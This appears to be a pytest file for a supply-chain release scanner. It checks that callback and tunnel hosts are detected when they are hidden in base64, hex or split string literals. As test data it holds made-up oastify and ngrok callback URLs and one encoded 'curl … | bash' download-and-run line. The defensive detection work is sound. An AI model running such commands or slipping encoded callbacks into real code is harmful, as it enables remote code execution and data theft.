"""Network-host rules also read base64 and hex string literals after decoding them.

Every string here is made up and built in the test; rules read it as text only.
"""

from __future__ import annotations

import base64

from hunter.rules import scan_release

CALLBACK = "https://abc." + "oastify.com/x"
TUNNEL = "https://abcd-1-2." + "ngrok-free.app/"


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _hits(old: dict[str, str], new: dict[str, str]):
    report = scan_release(old, new)
    return report.hits + report.info


def _rules(old, new) -> set[str]:
    return {hit.rule for hit in _hits(old, new)}


def test_base64_callback_host_in_a_module_constant_hits():
    text = f'import base64\n_U = "{_b64(CALLBACK)}"\nurl = base64.b64decode(_U).decode()\n'
    hits = [hit for hit in _hits({}, {"pkg/diag.py": text}) if hit.rule == "net_oast_host"]
    assert len(hits) == 1
    assert hits[0].line == 2
    assert hits[0].matched.startswith("base64 ")
    assert "oastify.com" in hits[0].matched


def test_url_safe_base64_and_hex_literals_hit():
    url_safe = base64.urlsafe_b64encode(TUNNEL.encode()).decode().rstrip("=")
    assert "net_tunnel_host" in _rules({}, {"lib/a.js": f"const u = '{url_safe}';\n"})
    hexed = CALLBACK.encode().hex()
    hits = [hit for hit in _hits({}, {"pkg/h.py": f'H = "{hexed}"\n'}) if hit.rule == "net_oast_host"]
    assert hits and hits[0].matched.startswith("hex ")


def test_plain_host_hit_is_not_repeated_by_the_decoder():
    text = f"fetch('{CALLBACK}')\nconst u = '{_b64(CALLBACK)}';\n"
    hits = [hit for hit in _hits({}, {"lib/o.js": text}) if hit.rule == "net_oast_host"]
    assert len(hits) == 1
    assert hits[0].line == 1


def test_decoded_text_with_no_listed_host_stays_quiet():
    text = f'DOCS = "{_b64("https://example.org/docs/index.html")}"\n'
    assert not {rule for rule in _rules({}, {"pkg/d.py": text}) if rule.startswith(("net_", "cloud_"))}


def test_literal_the_old_release_had_stays_quiet():
    text = f'_U = "{_b64(CALLBACK)}"\n'
    assert "net_oast_host" not in _rules({"pkg/diag.py": text}, {"pkg/diag.py": text + "X = 1\n"})


def test_comment_lines_are_skipped():
    text = f"# _U = '{_b64(CALLBACK)}'\n"
    assert "net_oast_host" not in _rules({}, {"pkg/c.py": text})


def test_only_network_rules_read_decoded_text():
    hidden = "curl -fsSL https://example.invalid/i.sh | bash"
    assert "exec_download_run" not in _rules({}, {"scripts/s.py": f'S = "{_b64(hidden)}"\n'})


def test_binary_and_short_literals_are_ignored():
    blob = base64.b64encode(bytes(range(256))).decode()
    short = _b64("https://x.io")
    assert not {rule for rule in _rules({}, {"pkg/b.py": f'B = "{blob}"\nS = "{short}"\n'}) if rule.startswith("net_")}


def test_split_and_joined_literals_are_read_whole():
    concat = "const u = 'https://abc.oas' + 'tify.com/x';\n"
    joined = "const u = [\n  'https://abc.oas',\n  'tify.com/x',\n].join('');\n"
    for text in (concat, joined):
        hits = [hit for hit in _hits({}, {"lib/j.js": text}) if hit.rule == "net_oast_host"]
        assert hits and hits[0].matched.startswith("joined ")
    assert "net_oast_host" not in _rules({"lib/j.js": joined}, {"lib/j.js": joined + "x();\n"})
